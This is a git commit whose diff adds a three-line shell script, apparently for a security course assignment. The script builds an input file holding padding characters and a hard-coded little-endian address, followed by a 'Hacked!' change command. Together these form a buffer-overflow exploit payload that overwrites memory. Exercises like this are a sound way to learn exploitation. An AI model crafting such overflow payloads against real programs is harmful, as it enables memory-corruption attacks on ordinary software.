5487f2db162359ca41d435c7374a13d0865c7654
jecndlria <jecndlria@gmail.com>
2024-03-08 23:08:21 -0800

    finished part 1

---
+++ p3/part1.sh
@@ -0,0 +1,3 @@
+# This script creates the part1 file used to execute the first part.
+echo -e "add 1 string test 0000000000000000000000000000000000\x50\x85\x04\x08" > part1
+echo -e "change 1 Hacked! test" >> part1
